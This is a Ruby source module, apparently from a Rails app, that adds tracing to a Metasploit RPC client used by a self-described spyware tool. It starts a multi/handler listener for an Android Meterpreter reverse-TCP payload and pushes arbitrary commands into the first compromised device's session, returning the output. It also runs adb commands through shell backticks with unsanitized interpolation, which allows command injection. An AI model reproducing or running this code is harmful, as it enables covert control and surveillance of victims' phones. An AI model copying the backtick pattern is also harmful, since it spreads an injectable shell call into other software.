# frozen_string_literal: true

require 'msfrpc-client'
require 'date'
require 'timeout'
require_relative '../lib/spyware_tracing'

module MsfInstrumentation
  def self.initialize_msf_tracing
    SpywareTracing.initialize_tracing
  end

  class InstrumentedMsfRpcClient
    def initialize(options = {})
      @tracer = SpywareTracing.tracer
      @client_options = options
      @rpc_client = nil
    end

    def login(username, password)
      SpywareTracing.trace_rpc_call('login', { user: username }) do |span|
        begin
          @rpc_client = Msf::RPC::Client.new(@client_options)
          result = @rpc_client.login(username, password)
          span.set_attribute('login.success', true)
          span.set_attribute('login.user', username)
          result
        rescue => e
          SpywareTracing.record_error(span, e, 'msf_login')
          raise
        end
      end
    end

    def call(method_name, *args)
      SpywareTracing.trace_rpc_call(method_name, { args_count: args.length }) do |span|
        begin
          result = @rpc_client.call(method_name, *args)
          span.set_attribute("rpc.result.type", result.class.name)
          
          # Log specific operations
          if method_name.include?('session')
            span.set_attribute('operation.category', 'session_management')
          elsif method_name.include?('module')
            span.set_attribute('operation.category', 'module_execution')
          elsif method_name.include?('exploit')
            span.set_attribute('operation.category', 'exploit')
          end
          
          result
        rescue => e
          SpywareTracing.record_error(span, e, "rpc_call_#{method_name}")
          raise
        end
      end
    end

    def logout
      SpywareTracing.trace_rpc_call('logout') do |span|
        begin
          @rpc_client.logout if @rpc_client
          span.set_attribute('logout.success', true)
        rescue => e
          SpywareTracing.record_error(span, e, 'msf_logout')
          raise
        end
      end
    end
  end

  module ApplicationControllerMixin
    def start_msf_process_traced(command)
      SpywareTracing.trace_session_command('active_session', command) do |span|
        begin
          increment_running_processes
          Timeout.timeout((ENV['MSF_TIMEOUT_SECONDS'].presence || 20).to_i) do
            # SonarQube S2068: Use centralized CredentialsService
            user = CredentialsService.msf_user
            password = CredentialsService.msf_password
            options = CredentialsService.msf_options

            rpc_client = InstrumentedMsfRpcClient.new(options)
            rpc_client.login(user, password)
            
            SpywareTracing.trace_rpc_call('module.execute', { payload: 'android/meterpreter/reverse_tcp' }) do |module_span|
              payloadOptions = {
                'PAYLOAD' => 'android/meterpreter/reverse_tcp',
                'LHOST' => '0.0.0.0',
                'LPORT' => 4444,
              }
              job = rpc_client.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
              module_span.set_attribute('job.id', job.to_s)
            end

            SpywareTracing.trace_rpc_call('session.list') do |session_span|
              session = rpc_client.call('session.list').keys[0]
              session_span.set_attribute('session.id', session)
              
              commandOutput = rpc_client.call('session.meterpreter_write', session, command)
              sleep 4
              commandOutput = rpc_client.call('session.meterpreter_read', session).values()[0].split('\n')
              
              span.set_attribute('command.status', 'success')
              span.set_attribute('command.output.lines', commandOutput.length)
            end

            rpc_client.logout
            commandOutput
          end
        rescue Timeout::Error => e
          SpywareTracing.record_error(span, e, 'start_msf_process_timeout')
          'Operation Failed: timeout'
        rescue Msf::RPC::ServerException => e
          SpywareTracing.record_error(span, e, 'start_msf_process')
          'Operation Failed'
        rescue => e
          SpywareTracing.record_error(span, e, 'start_msf_process')
          'Operation Failed'
        ensure
          increment_finished_processes
          decrement_running_processes
        end
      end
    end

    def run_adb_command_traced(command)
      SpywareTracing.trace_adb_operation(command) do |span|
        begin
          sleep 1
          increment_running_processes
          adb_target = ApplicationController.adb_target
          commandOutput = nil
          Timeout.timeout((ENV['ADB_TIMEOUT_SECONDS'].presence || 10).to_i) do
            commandOutput = `adb -H #{CredentialsService.adb_host} -s #{adb_target} #{command}`
          end
          span.set_attribute('adb.command.status', 'success')
          span.set_attribute('adb.output.size', commandOutput.length)
          commandOutput
        rescue Timeout::Error => e
          SpywareTracing.record_error(span, e, 'run_adb_command_timeout')
          'Operation Failed: timeout'
        rescue => e
          SpywareTracing.record_error(span, e, 'run_adb_command')
          'Operation Failed'
        ensure
          increment_finished_processes
          decrement_running_processes
        end
      end
    end

    private

    def increment_running_processes
      ApplicationController.nr_running_processes = ApplicationController.nr_running_processes.to_i + 1
    end

    def decrement_running_processes
      current = ApplicationController.nr_running_processes.to_i
      ApplicationController.nr_running_processes = [current - 1, 0].max
    end

    def increment_finished_processes
      ApplicationController.nr_finished_processes = ApplicationController.nr_finished_processes.to_i + 1
    end
  end
end
